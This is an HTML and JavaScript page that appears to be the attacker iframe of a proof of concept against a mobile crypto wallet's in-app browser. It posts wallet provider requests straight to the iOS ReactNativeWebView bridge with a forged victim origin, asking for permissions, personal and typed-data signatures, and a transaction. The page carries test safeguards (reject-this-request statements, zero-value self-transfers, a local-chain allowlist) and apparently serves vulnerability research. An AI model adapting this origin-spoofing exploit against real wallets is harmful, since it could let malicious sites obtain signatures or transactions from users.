<!doctype html>
<meta charset="utf-8">
<title>Controlled Origin B</title>
Cross-origin controlled attacker iframe.
<pre id="status"></pre>
<script>
'use strict';

const status = document.getElementById('status');
const params = new URLSearchParams(location.search);
const victimOrigin = params.get('victimOrigin');
const bridge = window.webkit?.messageHandlers?.ReactNativeWebView;
const SAFE_TEST_CHAIN_IDS = new Set(['0x7a69', '0x539']);

function show(text) {
  status.textContent += text + '\n';
}

function sendParent(data) {
  parent.postMessage(data, victimOrigin);
}

function validAddress(value) {
  return /^0x[0-9a-fA-F]{40}$/.test(value);
}

function randomHex(bytes) {
  const data = new Uint8Array(bytes);
  crypto.getRandomValues(data);
  return [...data].map(value => value.toString(16).padStart(2, '0')).join('');
}

function utf8Hex(value) {
  return '0x' + [...new TextEncoder().encode(value)]
    .map(byte => byte.toString(16).padStart(2, '0')).join('');
}

function postProviderRequest(id, method, requestParams, proof) {
  if (!bridge?.postMessage) throw new Error('ReactNativeWebView WKScriptMessageHandler unavailable');
  const wrapper = JSON.stringify({
    method: 'provider_request',
    payload: JSON.stringify({
      id,
      origin: victimOrigin,
      request: { method, params: requestParams }
    })
  });
  bridge.postMessage(wrapper);
  sendParent({ type: 'REQUEST_SENT', id, method, proof });
}

if (!victimOrigin || new URL(victimOrigin).origin !== victimOrigin) {
  throw new Error('Invalid victimOrigin: ' + victimOrigin);
}

show('Actual Origin B: ' + location.origin);
show('Claimed Origin A: ' + victimOrigin);
show('iOS raw bridge: ' + Boolean(bridge?.postMessage));

addEventListener('message', event => {
  if (event.source !== parent || event.origin !== victimOrigin) return;
  const data = event.data;
  if (!data?.type) return;

  sendParent({ type: 'TRIGGER_RECEIVED', command: data.type });

  try {
    if (data.type === 'GET_PERMISSIONS_AS_A') {
      postProviderRequest(data.id, 'wallet_getPermissions', [], {
        actualOrigin: location.origin,
        claimedOrigin: victimOrigin
      });
      return;
    }

    if (!validAddress(data.account)) throw new Error('Valid connected burner account required');

    if (data.type === 'PERSONAL_SIGN_AS_A') {
      const nonce = randomHex(12);
      const statement = [
        'CORE CROSS-ORIGIN AUTHORIZATION TEST',
        'No authentication or asset authorization.',
        'Actual sender: ' + location.origin,
        'Claimed requester: ' + victimOrigin,
        'Nonce: ' + nonce
      ].join('\n');
      postProviderRequest(data.id, 'personal_sign', [utf8Hex(statement), data.account], {
        nonce,
        statement,
        account: data.account
      });
      return;
    }

    if (data.type === 'TYPED_DATA_AS_A') {
      const nonce = '0x' + randomHex(32);
      const numericChainId = Number.parseInt(String(data.chainId), 16);
      if (!Number.isSafeInteger(numericChainId)) throw new Error('Invalid chainId');
      const typedData = {
        types: {
          EIP712Domain: [
            { name: 'name', type: 'string' },
            { name: 'version', type: 'string' },
            { name: 'chainId', type: 'uint256' }
          ],
          CoreOriginBoundaryTest: [
            { name: 'statement', type: 'string' },
            { name: 'actualSender', type: 'string' },
            { name: 'claimedRequester', type: 'string' },
            { name: 'nonce', type: 'bytes32' }
          ]
        },
        primaryType: 'CoreOriginBoundaryTest',
        domain: {
          name: 'Core Origin Boundary Lab',
          version: '1',
          chainId: numericChainId
        },
        message: {
          statement: 'Controlled test only. Reject this request.',
          actualSender: location.origin,
          claimedRequester: victimOrigin,
          nonce
        }
      };
      postProviderRequest(data.id, 'eth_signTypedData_v4', [data.account, JSON.stringify(typedData)], {
        nonce,
        account: data.account,
        typedData
      });
      return;
    }

    if (data.type === 'ZERO_TX_AS_A') {
      if (!SAFE_TEST_CHAIN_IDS.has(String(data.chainId).toLowerCase())) {
        throw new Error('Transaction test blocked outside the local-development-chain allowlist');
      }
      const transaction = {
        from: data.account,
        to: data.account,
        value: '0x0',
        data: '0x'
      };
      postProviderRequest(data.id, 'eth_sendTransaction', [transaction], {
        instruction: 'REJECT/CANCEL IN CORE',
        chainId: data.chainId,
        transaction
      });
    }
  } catch (error) {
    sendParent({
      type: 'CHILD_ERROR',
      id: data.id,
      message: String(error?.message || error)
    });
  }
});

sendParent({
  type: 'READY',
  victimOrigin,
  actualOrigin: location.origin,
  isSubframe: self !== top,
  bridgeVisible: Boolean(bridge?.postMessage)
});
</script>
